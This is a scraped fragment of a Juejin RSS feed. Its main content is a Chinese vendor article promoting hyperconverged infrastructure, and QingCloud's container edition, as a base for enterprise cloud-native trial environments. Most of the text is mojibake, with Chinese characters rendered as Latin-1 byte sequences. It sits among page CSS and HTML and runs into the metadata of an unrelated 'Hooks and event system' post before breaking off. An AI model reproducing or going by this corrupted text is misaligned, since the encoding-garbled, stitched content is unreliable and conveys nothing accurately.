12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å¯¹äºå¤šæ•°ä¼ä¸šè€Œè¨€ï¼Œäº‘åŸç”Ÿè½¬å‹ä»ä¸æ˜¯â€œä¸€æ­¥åˆ°ä½â€çš„è±ªèµŒï¼Œè€Œæ˜¯é€šè¿‡æ­å»ºè½»é‡åŒ–â€œè¯•éªŒç”°â€é€æ­¥éªŒè¯ã€è¿­ä»£çš„è¿‡ç¨‹ã€‚è¿™ä¸ªè¯•éªŒç”°æ—¢è¦ä½æˆæœ¬ã€æ˜“éƒ¨ç½²ï¼Œåˆè¦èƒ½æ¨¡æ‹ŸçœŸå®ç”Ÿäº§ç¯å¢ƒçš„å¤æ‚è´Ÿè½½ï¼Œè¿˜è¦ä¸ºåç»­è§„æ¨¡åŒ–æ‰©å±•é¢„ç•™ç©ºé—´ã€‚è¶…èåˆå‡­å€Ÿâ€œè®¡ç®—ã€å­˜å‚¨ã€ç½‘ç»œä¸€ä½“åŒ–â€çš„å¤©ç„¶ä¼˜åŠ¿ï¼Œæˆä¸ºæ„å»ºäº‘åŸç”Ÿè¯•éªŒç”°çš„æ ¸å¿ƒè½½ä½“ã€‚è€Œä¸€å¥—åˆæ ¼çš„è¶…èåˆï¼Œç»éç¡¬ä»¶çš„ç®€å•å †ç Œï¼Œæ›´éœ€å…·å¤‡ä¸€å¥—è´´åˆäº‘åŸç”Ÿéœ€æ±‚çš„â€œè‡ªæˆ‘ä¿®å…»â€ï¼Œæ–¹èƒ½æ‰¿è½½èµ·æŠ€æœ¯éªŒè¯ä¸ä¸šåŠ¡åˆ›æ–°çš„åŒé‡ä½¿å‘½ã€‚</p>
<p><strong>ä¸€ã€è¯•éªŒç”°çš„æ ¸å¿ƒè¯‰æ±‚ï¼šä¸ºä½•è¶…èåˆæ˜¯æœ€ä¼˜è§£ï¼Ÿ</strong></p>
<p>ä¼ä¸šæ­å»ºäº‘åŸç”Ÿè¯•éªŒç”°ï¼Œæ ¸å¿ƒè¯‰æ±‚é›†ä¸­åœ¨ä¸‰ç‚¹ï¼šä½æˆæœ¬è¯•é”™ã€å…¨åœºæ™¯è¦†ç›–ã€å¹³æ»‘æ‰©å±•ã€‚ä¼ ç»Ÿæ¶æ„ä¸‹ï¼Œè¦ä¹ˆéœ€å•ç‹¬éƒ¨ç½²è™šæ‹Ÿæœºé›†ç¾¤ä¸å®¹å™¨é›†ç¾¤ï¼Œå½¢æˆèµ„æºå­¤å²›ä¸”è¿ç»´å¤æ‚ï¼›è¦ä¹ˆä¾èµ–å…¬æœ‰äº‘è¯•éªŒç¯å¢ƒï¼Œæ•°æ®éšç§ä¸æœ¬åœ°åŒ–é€‚é…æ€§éš¾ä»¥ä¿éšœã€‚è¶…èåˆåˆ™é€šè¿‡è½¯ä»¶å®šä¹‰æŠ€æœ¯ï¼Œå°†é€šç”¨ç‰©ç†æœåŠ¡å™¨è½¬åŒ–ä¸ºâ€œéº»é›€è™½å°ã€äº”è„ä¿±å…¨â€çš„åŸºç¡€è®¾æ–½å•å…ƒï¼Œå®Œç¾å¥‘åˆè¯•éªŒç”°éœ€æ±‚ã€‚</p>
<p>ä»æˆæœ¬ç»´åº¦çœ‹ï¼Œå•å¥—è¶…èåˆæ— éœ€ä¸“ç”¨ç¡¬ä»¶ï¼ŒåŸºäºé€šç”¨x86æœåŠ¡å™¨å³å¯éƒ¨ç½²ï¼Œå¤§å¹…é™ä½åˆå§‹æŠ•å…¥ï¼ŒåŒæ—¶é¿å…èµ„æºæµªè´¹ã€‚ä»åœºæ™¯ç»´åº¦ï¼Œå®ƒèƒ½åŒæ—¶æ‰¿è½½è™šæ‹Ÿæœºï¼ˆVMï¼‰ã€å®¹å™¨ç­‰å¼‚æ„è´Ÿè½½ï¼Œæ—¢æ»¡è¶³é—ç•™ç³»ç»Ÿçš„è¿ç§»éªŒè¯ï¼Œåˆæ”¯æŒå¾®æœåŠ¡ã€å‡½æ•°è®¡ç®—ç­‰äº‘åŸç”Ÿåº”ç”¨çš„å¼€å‘æµ‹è¯•ã€‚ä»æ‰©å±•ç»´åº¦ï¼Œå•å¥—è¶…èåˆå¯ä½œä¸ºé›†ç¾¤èµ·ç‚¹ï¼Œåç»­æ–°å¢å•å…ƒå³å¯å®ç°åœ¨çº¿æ‰©å®¹ï¼Œæ— éœ€é‡æ„æ¶æ„ï¼Œå¹³æ»‘è¿‡æ¸¡åˆ°ç”Ÿäº§ç¯å¢ƒã€‚è¿™ç§â€œå°è€Œå…¨ã€å¯æˆé•¿â€çš„ç‰¹æ€§ï¼Œè®©è¶…èåˆæˆä¸ºäº‘åŸç”Ÿè¯•éªŒç”°çš„é¦–é€‰ã€‚</p>
<p><strong>äºŒã€è¶…èåˆçš„å››å¤§â€œè‡ªæˆ‘ä¿®å…»â€ï¼šç­‘ç‰¢è¯•éªŒç”°æ ¹åŸº</strong></p>
<p>äº‘åŸç”Ÿè¯•éªŒç”°çš„æ ¸å¿ƒä»·å€¼æ˜¯â€œçœŸå®æ¨¡æ‹Ÿã€é«˜æ•ˆéªŒè¯â€ï¼Œè¿™è¦æ±‚è¶…èåˆå¿…é¡»çªç ´ä¼ ç»Ÿè™šæ‹ŸåŒ–æ¶æ„çš„èƒ½åŠ›è¾¹ç•Œï¼Œå…·å¤‡å››å¤§æ ¸å¿ƒç´ å…»ï¼Œæ‰èƒ½è®©è¯•éªŒç»“æœå¯ä¿¡ã€å¯å¤ç”¨ã€‚</p>
<p><strong>1. å…¼å®¹åŒ…å®¹ï¼šæ‰“ç ´è´Ÿè½½ä¸ç¡¬ä»¶çš„åŒé‡å£å’</strong></p>
<p>è¯•éªŒç”°éœ€é¢å¯¹â€œæ–°æ—§å…±å­˜â€çš„å¤æ‚è´Ÿè½½ï¼šæ—¢æœ‰åŸºäºVMçš„æ ¸å¿ƒä¸šåŠ¡åŸå‹ï¼Œä¹Ÿæœ‰å®¹å™¨åŒ–çš„å¾®æœåŠ¡åº”ç”¨ï¼Œç”šè‡³å¯èƒ½æ¶‰åŠè£¸é‡‘å±éƒ¨ç½²çš„é«˜æ€§èƒ½ç»„ä»¶ã€‚è¿™å°±è¦æ±‚è¶…èåˆå…·å¤‡â€œå…¨è¿è¡Œæ€â€æ”¯æŒèƒ½åŠ›ï¼Œæ— éœ€åŒºåˆ†è´Ÿè½½ç±»å‹ï¼Œå®ç°ç»Ÿä¸€ç¼–æ’ä¸ç®¡ç†ã€‚åŒæ—¶ï¼Œä¼ä¸šç°æœ‰æœåŠ¡å™¨ç¡¬ä»¶å¾€å¾€å­˜åœ¨å“ç‰Œã€é…ç½®å¼‚æ„çš„æƒ…å†µï¼Œè¶…èåˆéœ€æ‘†è„±ç¡¬ä»¶ç»‘å®šï¼Œå…¼å®¹Intelã€AMDç­‰ä¸åŒæ¶æ„CPUï¼Œä»¥åŠæ–°æ—§æœåŠ¡å™¨è®¾å¤‡ï¼Œæœ€å¤§åŒ–ä¿æŠ¤æ—¢æœ‰æŠ•èµ„ã€‚</p>
<p>è¿™ç§å…¼å®¹æ€§å¹¶éç®€å•é€‚é…ï¼Œè€Œæ˜¯ä»å†…æ ¸å±‚å®ç°èåˆâ€”â€”å°†è™šæ‹ŸåŒ–å†…æ ¸ä¸å®¹å™¨å¼•æ“ã€ç¡¬ä»¶é©±åŠ¨æ— ç¼é›†æˆï¼Œç¡®ä¿ä¸åŒè´Ÿè½½åœ¨åŒä¸€å¥—è¶…èåˆä¸Šé«˜æ•ˆè¿è¡Œï¼Œæ— æ€§èƒ½æŸè€—ã€‚å°±åƒä¸€ä¸ªä¸‡èƒ½å·¥ä½œå°ï¼Œæ—¢èƒ½é€‚é…è€å¼å·¥å…·ï¼Œä¹Ÿèƒ½å…¼å®¹æ–°å‹è®¾å¤‡ï¼Œè®©å¼€å‘è€…æ— éœ€ä¸ºè´Ÿè½½ç±»å‹å¦¥åã€‚</p>
<p><strong>2. é«˜æ•ˆé›†çº¦ï¼šæ¦¨å¹²æ¯ä¸€åˆ†ç¡¬ä»¶èµ„æºä»·å€¼</strong></p>
<p>è¯•éªŒç”°é€šå¸¸èµ„æºæœ‰é™ï¼Œä¸€å¥—è¶…èåˆéœ€æ‰¿æ‹…å¤šåœºæ™¯æµ‹è¯•ä»»åŠ¡ï¼Œèµ„æºåˆ©ç”¨ç‡ç›´æ¥å†³å®šè¯•éªŒæ•ˆç‡ã€‚ä¼ ç»Ÿæ¶æ„å› è™šæ‹ŸåŒ–å±‚ä¸å®¹å™¨å±‚å åŠ ï¼ŒCPUå¼€é”€å¯è¾¾15%ä»¥ä¸Šï¼Œå­˜å‚¨èµ„æºå› é•œåƒå†—ä½™é€ æˆå¤§é‡æµªè´¹ã€‚åˆæ ¼çš„è¶…èåˆéœ€é€šè¿‡æ¶æ„ä¼˜åŒ–ï¼Œå®ç°èµ„æºæ•ˆç‡çš„æè‡´é‡Šæ”¾ã€‚</p>
<p>ä¸€æ–¹é¢ï¼Œé‡‡ç”¨â€œè™šæ‹ŸåŒ–+å®¹å™¨â€åŒæ ˆåŸç”Ÿæ¶æ„ï¼Œæ¶ˆé™¤ä¸­é—´å±‚æŸè€—ï¼Œè®©å®¹å™¨ç›´æ¥è¿è¡Œåœ¨ç‰©ç†æœºå†…æ ¸ä¸Šï¼ŒCPUå¼€é”€æ¥è¿‘é›¶ï¼Œç›¸åŒé…ç½®ä¸‹å¯å¤šæ‰¿è½½50%ä»¥ä¸Šçš„è´Ÿè½½ã€‚å¦ä¸€æ–¹é¢ï¼Œé€šè¿‡åˆ†å¸ƒå¼å­˜å‚¨æ± æ•´åˆæœ¬åœ°ç¡¬ç›˜èµ„æºï¼Œæä¾›å—ã€æ–‡ä»¶ã€å¯¹è±¡ç»Ÿä¸€å­˜å‚¨æœåŠ¡ï¼Œç»“åˆç¼“å­˜åˆ†å±‚æŠ€æœ¯ï¼Œæå‡IOæ€§èƒ½çš„åŒæ—¶å‡å°‘å­˜å‚¨å†—ä½™ï¼Œ4KéšæœºIOPSæ€§èƒ½å¯æå‡1å€ä»¥ä¸Šã€‚è¿™ç§é›†çº¦æ€§è®©ä¸€å¥—è¶…èåˆèƒ½åŒæ—¶æ”¯æ’‘å¤šä¸ªæµ‹è¯•ä»»åŠ¡ï¼Œé¿å…èµ„æºé—²ç½®ã€‚</p>
<p><strong>3. è½»é‡æ˜“ç”¨ï¼šé™ä½è¯•éªŒç”°æ­å»ºä¸è¿ç»´é—¨æ§›</strong></p>
<p>è¯•éªŒç”°çš„ä½¿ç”¨è€…å¤šä¸ºå¼€å‘ã€æµ‹è¯•äººå‘˜ï¼Œè€Œéä¸“ä¸šè¿ç»´å›¢é˜Ÿï¼Œè¶…èåˆå¿…é¡»å…·å¤‡â€œå¼€ç®±å³ç”¨ã€æç®€è¿ç»´â€çš„ç‰¹æ€§ã€‚å¤æ‚çš„éƒ¨ç½²æµç¨‹ã€ç¹ççš„ç®¡ç†æ“ä½œï¼Œä¼šå¤§å¹…æ¶ˆè€—è¯•éªŒç²¾åŠ›ï¼Œåç¦»æŠ€æœ¯éªŒè¯çš„æ ¸å¿ƒç›®æ ‡ã€‚</p>
<p>è½»é‡æ˜“ç”¨ä½“ç°åœ¨ä¸‰ä¸ªå±‚é¢ï¼šä¸€æ˜¯å¿«é€Ÿéƒ¨ç½²ï¼Œå•å¥—è¶…èåˆå¯é€šè¿‡å¯è§†åŒ–ç•Œé¢ä¸€é”®å®Œæˆè®¡ç®—ã€å­˜å‚¨ã€ç½‘ç»œçš„åˆå§‹åŒ–é…ç½®ï¼Œéƒ¨ç½²æ—¶é—´æ§åˆ¶åœ¨å°æ—¶çº§ï¼Œæ— éœ€æ‰‹åŠ¨ç¼–å†™è„šæœ¬ï¼›äºŒæ˜¯ç»Ÿä¸€è¿ç»´ï¼Œé›†æˆç›‘æ§ã€æ—¥å¿—ã€å‘Šè­¦åŠŸèƒ½ï¼Œé€šè¿‡ä¸€ä¸ªå¹³å°å®ç°è´Ÿè½½ç”Ÿå‘½å‘¨æœŸç®¡ç†ã€èµ„æºè°ƒåº¦ã€æ•…éšœæ’æŸ¥ï¼Œæ— éœ€åˆ‡æ¢å¤šå¥—å·¥å…·ï¼›ä¸‰æ˜¯è‡ªåŠ¨åŒ–é›†æˆï¼Œæ”¯æŒCI/CDæµæ°´çº¿å¯¹æ¥ï¼Œå®ç°åº”ç”¨ä»æ„å»ºã€æµ‹è¯•åˆ°éƒ¨ç½²çš„å…¨æµç¨‹è‡ªåŠ¨åŒ–ï¼Œå¥‘åˆDevOpsç†å¿µã€‚å°±åƒä¸€å°æ™ºèƒ½å®¶ç”µï¼Œæ— éœ€å¤æ‚è°ƒè¯•ï¼Œé€šç”µå³å¯ä½¿ç”¨ï¼Œè®©å›¢é˜Ÿèšç„¦ä¸šåŠ¡åˆ›æ–°è€ŒéåŸºç¡€è®¾æ–½ç»´æŠ¤ã€‚</p>
<p><strong>4. å®‰å…¨å¯é ï¼šå®ˆä½è¯•éªŒæ•°æ®ä¸ä¸šåŠ¡è¿ç»­æ€§åº•çº¿</strong></p>
<p>è¯•éªŒç”°è™½éç”Ÿäº§ç¯å¢ƒï¼Œä½†æ‰¿è½½ç€ä¸šåŠ¡åŸå‹ã€æ ¸å¿ƒç®—æ³•ç­‰æ•æ„Ÿæ•°æ®ï¼ŒåŒæ—¶éœ€ä¿éšœæµ‹è¯•è¿‡ç¨‹ä¸ä¸­æ–­ï¼Œé¿å…é‡å¤åŠ³åŠ¨ã€‚è¿™è¦æ±‚è¶…èåˆå…·å¤‡å®Œå–„çš„å®‰å…¨ä¸é«˜å¯ç”¨èƒ½åŠ›ï¼Œä¸ºè¯•éªŒä¿é©¾æŠ¤èˆªã€‚</p>
<p>åœ¨æ•°æ®å®‰å…¨ä¸Šï¼Œéœ€æ”¯æŒå¤šå‰¯æœ¬å†—ä½™ã€å¿«ç…§ã€å…‹éš†ç­‰æ•°æ®ä¿æŠ¤åŠŸèƒ½ï¼Œå³ä½¿ç¡¬ç›˜æ•…éšœä¹Ÿèƒ½å¿«é€Ÿæ¢å¤æ•°æ®ï¼Œæ— éœ€æ‹…å¿ƒè¯•éªŒæˆæœä¸¢å¤±ã€‚åœ¨ä¸šåŠ¡å¯é ä¸Šï¼Œå…·å¤‡æ•…éšœè‡ªæ„ˆèƒ½åŠ›ï¼Œå‡ºç°è½»å¾®æ•…éšœæ—¶å¯è‡ªåŠ¨ä¿®å¤ï¼Œä¸å½±å“è´Ÿè½½è¿è¡Œï¼›åŒæ—¶æ”¯æŒæ— ä»£ç†å¤‡ä»½ï¼Œæ— éœ€é¢å¤–éƒ¨ç½²è½¯ä»¶å³å¯å®ç°VMä¸å®¹å™¨çš„å¤‡ä»½æ¢å¤ã€‚åœ¨è®¿é—®å®‰å…¨ä¸Šï¼Œé‡‡ç”¨å¤šç§Ÿæˆ·éš”ç¦»ä¸é›¶ä¿¡ä»»è®¤è¯æœºåˆ¶ï¼Œç¡®ä¿ä¸åŒå›¢é˜Ÿçš„è¯•éªŒä»»åŠ¡ç›¸äº’ç‹¬ç«‹ï¼Œæ•°æ®ä¸æ³„éœ²ã€‚</p>
<p><strong>ä¸‰ã€é’äº‘äº‘æ˜“æ·ï¼ˆå®¹å™¨ç‰ˆï¼‰ï¼šè¶…èåˆçš„â€œä¿®å…»å…¸èŒƒâ€</strong></p>
<p>å½“ä¼ä¸šä¸ºæ­å»ºäº‘åŸç”Ÿè¯•éªŒç”°ç­›é€‰è¶…èåˆæ–¹æ¡ˆæ—¶ï¼Œé’äº‘äº‘æ˜“æ·ï¼ˆå®¹å™¨ç‰ˆï¼‰å‡­å€Ÿå¯¹å››å¤§â€œä¿®å…»â€çš„æ·±åº¦è·µè¡Œï¼Œæˆä¸ºå…¼å…·å®ç”¨æ€§ä¸å‰ç»æ€§çš„ç†æƒ³é€‰æ‹©ã€‚å®ƒå¹¶éç®€å•çš„è¶…èåˆè½¯ä»¶ï¼Œè€Œæ˜¯ä¸ºäº‘åŸç”Ÿè¯•éªŒç”°é‡èº«æ‰“é€ çš„ä¸“å±æ–¹æ¡ˆï¼Œè®©â€œä»é›¶æ­å»ºã€å¿«é€ŸéªŒè¯ã€å¹³æ»‘æ‰©å±•â€æˆä¸ºç°å®ã€‚</p>
<p>åœ¨å…¼å®¹æ€§ä¸Šï¼Œäº‘æ˜“æ·ï¼ˆå®¹å™¨ç‰ˆï¼‰å½»åº•æ‰“ç ´ç¡¬ä»¶ä¸è´Ÿè½½å£å’â€”â€”æ”¯æŒx86æ¶æ„å…¨å“ç‰ŒæœåŠ¡å™¨ï¼Œæ— è®ºæ˜¯æ–°é‡‡è´­è®¾å¤‡è¿˜æ˜¯ä¼ä¸šè€æ—§æœåŠ¡å™¨ï¼Œéƒ½èƒ½å¹³æ»‘æ¥å…¥å¹¶ç»Ÿä¸€ç®¡ç†ï¼ŒçœŸæ­£å®ç°â€œç¡¬ä»¶æ— å…³æ€§â€ã€‚åŒæ—¶æ·±åº¦æ•´åˆKubeVirtç»„ä»¶ï¼Œå°†VMä»¥è‡ªå®šä¹‰èµ„æºå½¢å¼çº³å…¥K8sè°ƒåº¦ä½“ç³»ï¼Œå®ç°å®¹å™¨ã€VMè´Ÿè½½çš„ç»Ÿä¸€ç¼–æ’ï¼Œå®Œç¾è¦†ç›–è¯•éªŒç”°çš„å…¨åœºæ™¯éœ€æ±‚ã€‚</p>
<p>åœ¨èµ„æºæ•ˆç‡ä¸Šï¼Œå®ƒé‡‡ç”¨â€œç‰©ç†æœº+K8sâ€ä¸¤å±‚æ¶æ„ï¼Œæ¶ˆé™¤è™šæ‹ŸåŒ–ä¸­é—´å±‚æŸè€—ï¼Œç»“åˆæ™ºèƒ½è°ƒåº¦ç®—æ³•ï¼Œå°†CPUåˆ©ç”¨ç‡æå‡15%ä»¥ä¸Šï¼Œå­˜å‚¨èµ„æºåˆ©ç”¨ç‡æå‡30%ã€‚é’ˆå¯¹è¯•éªŒç”°å¤šä»»åŠ¡å¹¶è¡Œçš„ç‰¹ç‚¹ï¼Œé€šè¿‡åˆ†å¸ƒå¼å­˜å‚¨ç¼“å­˜ä¼˜åŒ–ï¼Œè®©IOæ€§èƒ½æ›´ç¨³å®šï¼Œå³ä½¿åŒæ—¶è¿è¡Œå¤šä¸ªæµ‹è¯•è´Ÿè½½ï¼Œä¹Ÿèƒ½ä¿éšœå“åº”é€Ÿåº¦ï¼Œé¿å…èµ„æºç«äº‰ç“¶é¢ˆã€‚</p>
<p>åœ¨æ˜“ç”¨æ€§ä¸Šï¼Œäº‘æ˜“æ·ï¼ˆå®¹å™¨ç‰ˆï¼‰å°†éƒ¨ç½²æ•ˆç‡æå‡è‡³æ–°é«˜åº¦ï¼Œ3èŠ‚ç‚¹é›†ç¾¤éƒ¨ç½²æ—¶é—´å¯ç¼©çŸ­è‡³60åˆ†é’Ÿï¼Œå•å¥—éƒ¨ç½²æ›´å¯å®ç°â€œå¼€ç®±å³äº‘â€ï¼Œæ— éœ€ä¸“ä¸šè¿ç»´ä»‹å…¥ã€‚é›†æˆKubeSphereç®¡ç†å¹³å°ï¼Œæä¾›å¯è§†åŒ–ç•Œé¢ä¸ä¸€é”®å¼æ“ä½œï¼Œå¼€å‘è€…æ— éœ€æŒæ¡å¤æ‚çš„K8så‘½ä»¤ï¼Œå³å¯å®Œæˆè´Ÿè½½éƒ¨ç½²ã€ç›‘æ§å‘Šè­¦ã€å¤‡ä»½æ¢å¤ç­‰å…¨æµç¨‹æ“ä½œï¼Œå¤§å¹…é™ä½è¯•éªŒé—¨æ§›ã€‚</p>
<p>äº‘åŸç”Ÿè¯•éªŒç”°æ˜¯ä¼ä¸šè½¬å‹çš„â€œå‰å“¨ç«™â€ï¼Œè€Œè¶…èåˆçš„â€œä¿®å…»â€ç›´æ¥å†³å®šå‰å“¨ç«™çš„æˆ˜æ–—åŠ›ã€‚é’äº‘äº‘æ˜“æ·ï¼ˆå®¹å™¨ç‰ˆï¼‰ä»¥è´´åˆè¯•éªŒç”°éœ€æ±‚çš„æŠ€æœ¯è®¾è®¡ï¼Œå°†å…¼å®¹ã€é«˜æ•ˆã€æ˜“ç”¨ã€å¯é å››å¤§èƒ½åŠ›èå…¥æ ¸å¿ƒï¼Œæ—¢æ»¡è¶³å½“ä¸‹çš„ä½æˆæœ¬éªŒè¯éœ€æ±‚ï¼Œåˆä¸ºåç»­è§„æ¨¡åŒ–éƒ¨ç½²é“ºå«äº†ç»Ÿä¸€æŠ€æœ¯åº•åº§ã€‚å¯¹äºæƒ³è¦ç¨³å¦¥æ¨è¿›äº‘åŸç”Ÿè½¬å‹çš„ä¼ä¸šè€Œè¨€ï¼Œé€‰æ‹©è¿™æ ·ä¸€å¥—â€œæœ‰ä¿®å…»â€çš„è¶…èåˆï¼Œå°±ç­‰äºä¸ºåˆ›æ–°ä¹‹è·¯ç­‘ç‰¢äº†ç¬¬ä¸€å—åŸºçŸ³ï¼Œè®©æ¯ä¸€æ¬¡è¯•éªŒéƒ½èƒ½è½¬åŒ–ä¸ºå®å®åœ¨åœ¨çš„è½¬å‹åŠ¨åŠ›ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ç¬¬ 7 ç« ï¼šHooks ä¸äº‹ä»¶ç³»ç»Ÿ]]></title>    <link>https://juejin.cn/post/7597900782910521363</link>    <guid>https://juejin.cn/post/7597900782910521363</guid>    <pubDate>2026-01-22T04:07:35.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597900782910521363" data-draft-id="7597811700284325907" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content=" ç¬¬ 7 ç« ï¼šHooks ä¸äº‹ä»¶ç³»ç»Ÿ"/> <meta itemprop="keywords" content="å‰ç«¯,Agent,AIGC"/> <meta itemprop="datePublished" content="2026-01-22T04:07:35.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="èŠ‹åœ†ai"/> <meta itemprop="url" content="https://juejin.cn/user/1451828494217415"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
             ç¬¬ 7 ç« ï¼šHooks ä¸äº‹ä»¶ç³»ç»Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1451828494217415/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    èŠ‹åœ†ai
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-22T04:07:35.000Z" title="Thu Jan 22 2026 04:07:35 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-22
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item 